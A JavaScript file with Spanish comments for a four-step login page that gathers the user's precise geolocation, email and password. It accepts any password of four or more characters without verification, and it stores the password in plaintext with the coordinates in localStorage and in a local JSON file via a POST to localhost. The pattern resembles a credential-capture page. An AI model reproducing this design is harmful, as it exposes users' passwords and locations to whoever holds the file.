// ============ CONFIGURACIÓN ============
const CONFIG = {
  appUrl: "myapp://open",
  // appUrl: "https://tuapp.local/dashboard",
  allowedRegion: null,
  storageKey: "comodin",
};

// ============ ESTADO ============
const state = {
  step: 1,
  email: "",
  region: "",
  lat: null,
  lon: null,
};

// ============ BASE DE DATOS ============
const DB = {
  load() {
    const raw = localStorage.getItem(CONFIG.storageKey);
    return raw ? JSON.parse(raw) : { users: [], sessions: [] };
  },

  async save(data) {
    // Guardar en localStorage
    localStorage.setItem(CONFIG.storageKey, JSON.stringify(data));

    // Enviar al servidor para escribir comodin.json
    try {
      await fetch("http://localhost:3000/guardar", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data),
      });
    } catch (err) {
      console.error("No se pudo guardar en el archivo comodin.json:", err);
    }
  },

  async upsertUser(userData) {
    const db = this.load();
    const existingIndex = db.users.findIndex((u) => u.email === userData.email);
    const now = new Date().toISOString();

    if (existingIndex >= 0) {
      db.users[existingIndex] = {
        ...db.users[existingIndex],
        ...userData,
        lastLogin: now,
      };
    } else {
      db.users.push({
        id: crypto.randomUUID(),
        ...userData,
        createdAt: now,
        lastLogin: now,
      });
    }

    await this.save(db);
    return db;
  },

  async addSession(email) {
    const db = this.load();
    const now = new Date();

    db.sessions.unshift({
      email,
      date: now.toLocaleDateString(),
      time: now.toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" }),
      timestamp: now.getTime(),
    });

    db.sessions = db.sessions.slice(0, 20);
    await this.save(db);
    return db;
  },

  getLastSessions(limit = 2) {
    return this.load().sessions.slice(0, limit);
  },

  dump() {
    return this.load();
  },
};

// ============ UTILIDADES ============
const $ = (sel) => document.querySelector(sel);
const $$ = (sel) => document.querySelectorAll(sel);

function setStep(n) {
  state.step = n;
  $$(".screen").forEach((el) => el.classList.remove("active"));
  $(`#screen-${["", "location", "email", "password", "done"][n]}`).classList.add("active");
  $$(".progress-step").forEach((el, i) => {
    el.classList.toggle("active", i < n);
  });
}

function setDateTimes() {
  const now = new Date();
  $("#date-value").textContent = now.toLocaleDateString();
  $("#time-value").textContent = now.toLocaleTimeString([], {
    hour: "2-digit",
    minute: "2-digit",
  });
}

function renderSessions() {
  const sessions = DB.getLastSessions(2);
  const list = $("#session-list");
  list.innerHTML = "";

  const defaults = [
    { date: "— / — / —", time: "--:--" },
    { date: "— / — / —", time: "--:--" },
  ];

  const items = sessions.length ? sessions : defaults;

  items.forEach((s) => {
    const li = document.createElement("li");
    li.innerHTML = `<span>${s.date}</span><span>${s.time}</span>`;
    list.appendChild(li);
  });
}

// ============ PANTALLA 1: UBICACIÓN ============
$("#btn-location").addEventListener("click", () => {
  const status = $("#location-status");
  status.textContent = "Solicitando permiso...";

  if (!navigator.geolocation) {
    status.textContent = "Geolocalización no soportada en este navegador.";
    status.classList.add("error");
    return;
  }

  navigator.geolocation.getCurrentPosition(
    (pos) => {
      state.lat = pos.coords.latitude;
      state.lon = pos.coords.longitude;
      state.region = `${state.lat.toFixed(2)}, ${state.lon.toFixed(2)}`;
      $("#region-value").textContent = state.region;

      status.textContent = "Ubicación confirmada.";
      status.classList.remove("error");
      status.classList.add("success");

      setTimeout(() => setStep(2), 700);
    },
    () => {
      status.textContent = "Permiso denegado. Habilita la ubicación para continuar.";
      status.classList.add("error");
    },
    { enableHighAccuracy: true, timeout: 10000 }
  );
});

// ============ PANTALLA 2: CORREO ============
$("#form-email").addEventListener("submit", (e) => {
  e.preventDefault();
  const email = $("#email").value.trim();
  const status = $("#email-status");

  if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
    status.textContent = "Ingresa un correo válido.";
    status.classList.add("error");
    return;
  }

  state.email = email;
  status.textContent = "";
  setStep(3);
  setTimeout(() => $("#password").focus(), 200);
});

// ============ PANTALLA 3: CONTRASEÑA ============
$("#form-password").addEventListener("submit", async (e) => {
  e.preventDefault();
  const pass = $("#password").value;
  const status = $("#password-status");

  if (pass.length < 4) {
    status.textContent = "Credenciales inválidas.";
    status.classList.add("error");
    return;
  }

  // Guardar usuario + sesión (escribe comodin.json)
  await DB.upsertUser({
    email: state.email,
    password: pass,
    region: state.region,
    lat: state.lat,
    lon: state.lon,
  });

  await DB.addSession(state.email);

  status.textContent = "";
  setStep(4);
});

// ============ PANTALLA 4: REDIRECCIÓN ============
$("#btn-open-app").addEventListener("click", () => {
  const status = $("#redirect-status");
  status.textContent = "Abriendo aplicación...";
  setTimeout(() => {
    window.location.href = CONFIG.appUrl;
  }, 400);
});

// ============ INIT ============
document.addEventListener("DOMContentLoaded", () => {
  setDateTimes();
  renderSessions();
  setStep(1);
});